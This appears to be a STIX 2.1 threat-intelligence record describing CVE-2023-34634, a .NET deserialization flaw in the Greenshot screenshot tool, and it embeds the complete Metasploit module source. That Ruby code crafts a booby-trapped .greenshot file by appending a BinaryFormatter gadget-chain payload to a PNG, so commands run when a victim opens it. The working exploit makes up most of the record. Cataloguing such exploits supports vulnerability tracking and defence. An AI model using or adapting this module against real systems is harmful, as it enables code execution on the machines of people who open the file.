{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--040427f6-e150-4ca0-87f6-6b349fff549e",
    "created": "2024-08-14T16:37:31.388603Z",
    "modified": "2024-08-14T16:37:31.388607Z",
    "name": "Greenshot .NET Deserialization Fileformat Exploit",
    "description": " There exists a .NET deserialization vulnerability in Greenshot version 1.3.274 and below.  The deserialization allows the execution of commands when a user opens a Greenshot file.  The commands execute under the same permissions as the Greenshot service.  Typically, is the logged in user.  'DisclosureDate' => '2023-07-26'",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/greenshot_deserialize_cve_2023_34634.rb",
            "external_id": "greenshot_deserialize_cve_2023_34634.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-34634"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Post::File\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Greenshot .NET Deserialization Fileformat Exploit',\n        'Description' => %q{\n          There exists a .NET deserialization vulnerability in Greenshot version 1.3.274\n          and below.  The deserialization allows the execution of commands when a user opens\n          a Greenshot file.  The commands execute under the same permissions as the Greenshot\n          service.  Typically, is the logged in user.\n        },\n        'DisclosureDate' => '2023-07-26',\n        'Author' => [\n          'p4r4bellum',  # Discovery\n          'bwatters-r7', # msf exploit\n        ],\n        'References' => [\n          ['CVE', '2023-34634'],\n          ['EDB', '51633']\n        ],\n        'License' => MSF_LICENSE,\n        'Platform' => 'win',\n        'Arch' => ARCH_CMD,\n        'Targets' => [\n          [ 'Windows', {} ],\n        ],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [ARTIFACTS_ON_DISK, SCREEN_EFFECTS]\n        }\n      )\n    )\n\n    register_options([\n      OptPath.new('PNG_FILE', [false, 'PNG file to use'])\n    ])\n  end\n\n  def exploit\n    if datastore['PNG_FILE'].blank?\n      image_file = File.join(Msf::Config.data_directory, 'exploits', 'cve-2023-34634', 'test.png')\n    else\n      image_file = datastore['PNG_FILE']\n    end\n\n    datastore['FILENAME'] = Rex::Text.rand_text_alpha(rand(6..13)) if datastore['FILENAME'].blank?\n    if datastore['FILENAME'].length < 10 || datastore['FILENAME'][-10, -1] != '.greenshot'\n      datastore['FILENAME'] << '.greenshot'\n    end\n    cmd = payload.encoded\n\n    image_data = File.binread(image_file)\n\n    deserialize_cmd = ::Msf::Util::DotNetDeserialization.generate(\n      cmd,\n      gadget_chain: :WindowsIdentity,\n      formatter: :BinaryFormatter\n    )\n\n    payload_length = deserialize_cmd.length\n    outfile = image_data\n    outfile << deserialize_cmd\n    outfile << [payload_length].pack('Q')\n    outfile << 'Greenshot01.02'\n    file_create(outfile)\n  end\nend\n",
    "x_mitre_platforms": [
        "win'"
    ]
}